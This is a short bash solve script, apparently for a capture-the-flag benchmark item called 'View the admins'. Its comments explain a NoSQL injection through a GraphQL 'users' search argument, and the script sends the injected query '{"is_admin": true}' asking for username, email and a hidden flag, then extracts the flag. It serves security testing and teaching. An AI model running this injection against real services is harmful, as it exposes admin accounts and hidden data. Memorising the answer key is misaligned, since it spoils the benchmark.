#!/usr/bin/env bash
# XBEN-100-24 — "View the admins" (tags: nosqli, graphql)
#
# The `users` resolver takes a `search` argument, parses it as JSON, and hands
# the result to mongoengine as `filter(**criteria)`. The keyword arguments of a
# database query are therefore the client's to choose — including `is_admin`,
# which is the one field the listing page exists to hide.
#
# The GraphQL type also exposes `flag`, which the site's own query never asks
# for. Two halves of the same mistake: the filter is not constrained and the
# projection is not either.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben100-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/api/users' \
    --set 'header.Content-Type=application/json' \
    --set 'json.query={ users(search: "{\"is_admin\": true}") { username email flag } }' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
